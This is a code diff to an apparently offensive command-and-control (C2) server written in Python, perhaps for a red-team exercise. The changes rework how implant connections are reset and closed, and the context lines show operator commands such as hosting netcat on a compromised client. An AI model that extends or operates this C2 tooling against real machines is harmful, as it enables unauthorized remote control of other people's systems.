@@ -153,10 +153,6 @@ def handleClient(client):
             continue
 
 def removeClient(client):
-    try:
-        client.send("reset_connection")
-    except: 
-        pass
     try: #try to remove everything, but it might already be gone
         client.connected = False
         for service in SERVICES:
@@ -165,7 +161,13 @@ def removeClient(client):
         client.team.unassign(client)
         HOSTNAMES[HOSTNAMES.index(client.getHostname())].removeClient(client)
         CURRENT_CONNECTIONS_CLASS.remove(client)
+        client.socket.close()
     except Exception as e: 
+        client.socket.close()
+        try:
+            removeClient(client)
+        except:
+            pass
         pass
 
 ######TODO refactor this function
@@ -193,7 +195,6 @@ def copyKey(client_sock):
     
 def resetAll():
     for client in CURRENT_CONNECTIONS_CLASS:
-        client.send("reset_connection")
         removeClient(client) #TODO Might break things
 
 #Main Console for C2
@@ -373,7 +374,12 @@ def client_console(client): #previously took in cmd
                 client.send("ncport")
                 print("Netcat is being hosted on: " + client.IP + ":" + client.recv())
             elif "reset" in newCMD.lower():
-                connection.socket.send("reset_connection")
+                try:
+                    connection.socket.close()
+                except:
+                    pass
+                removeClient(client)
+                return
             elif "help" in newCMD: #Help menu
                 print("\nHelp Menu:\
                     \n\tUse 'exit' to return to main menu. \
@@ -518,7 +524,7 @@ def startTTY(IP):
 def shutdown_clients():
     for client in CURRENT_CONNECTIONS_CLASS:
         try:
-            client.send("reset_connection")
+            client.socket.close()
         except:
             continue
 
